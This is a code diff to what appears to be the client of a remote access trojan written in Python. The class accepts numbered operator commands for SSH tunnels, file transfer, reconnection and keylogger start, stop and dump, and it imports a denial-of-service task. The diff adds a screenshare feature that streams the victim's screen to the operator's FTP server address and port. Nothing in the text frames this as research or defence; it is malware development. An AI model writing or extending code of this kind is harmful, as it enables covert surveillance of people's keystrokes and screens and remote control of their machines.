@@ -9,7 +9,7 @@ from time import sleep
 from queue import Queue
 from tasks.dos import Cyclops
 from threading import Thread, RLock
-from . import ssh, sftp, screen, keylogger
+from . import ssh, sftp, screen, sscreenshare, keylogger
 
 
 class Shell(object):
@@ -19,13 +19,17 @@ class Shell(object):
         self.disconnected = False
         self.services = services
         self.session = sess_obj
-        self.keylogger = None
+        self.home = home
+
         self.is_alive = True
         self.lock = RLock()
-        self.task = None
-        self.home = home
-        self.ssh = None
+
         self.ftp = None
+        self.ssh = None
+        self.task = None
+        self.keylogger = None
+        self.screenshare = None
+
         self.cmds = {
             1: self.ssh_obj,
             2: self.reconnect,
@@ -41,6 +45,8 @@ class Shell(object):
             12: self.logger_start,
             13: self.logger_stop,
             14: self.logger_dump,
+            15: self.screenshare_start,
+            16: self.screenshare_stop
         }
 
         self.tasks = {
@@ -133,6 +139,23 @@ class Shell(object):
         t = Thread(target=self.ssh.client)
         t.daemon = True
         t.start()
+
+    def screenshare_start(self, update):
+        if self.screenshare:
+            self.screenshare.stop()
+
+        self.screenshare = sscreenshare.ScreenShare(
+            self.services['ftp']['ip'], self.services['ftp']['port'], update
+        )
+
+        if self.screenshare.setup() != 0:
+            self.screenshare = None
+        else:
+            Thread(target=self.screenshare.start, daemon=True).start()
+
+    def screenshare_stop(self, args):
+        if self.screenshare:
+            self.screenshare.stop()
 
     def download(self, args):
         print('Downloading ...')
